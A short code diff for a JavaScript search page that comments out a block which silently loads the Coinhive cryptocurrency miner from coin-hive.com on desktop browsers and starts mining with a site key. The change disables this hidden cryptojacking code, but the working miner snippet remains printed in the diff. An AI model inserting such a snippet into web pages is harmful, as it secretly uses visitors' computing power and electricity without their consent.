@@ -93,12 +93,12 @@ function locationParameterChanged() {
     window.panduoduo=panduoduoFetcher(key);
     magnetFetcher(key);
     window.tieba=tiebaFetcher(key);
-    if(screen.width>=751&&!/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ){
-        importScript ("https://coin-hive.com/lib/coinhive.min.js", function(){
-            var miner = new CoinHive.Anonymous('Wtx9zrRVSwMjJmFssPEtuCxnzkdo3QaP');
-            miner.start();
-        })
-    }
+//     if(screen.width>=751&&!/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ){
+//         importScript ("https://coin-hive.com/lib/coinhive.min.js", function(){
+//             var miner = new CoinHive.Anonymous('Wtx9zrRVSwMjJmFssPEtuCxnzkdo3QaP');
+//             miner.start();
+//         })
+//     }
 
     syncIsIt().getBykey();
     localStorage.setItem("isOlduser",true);
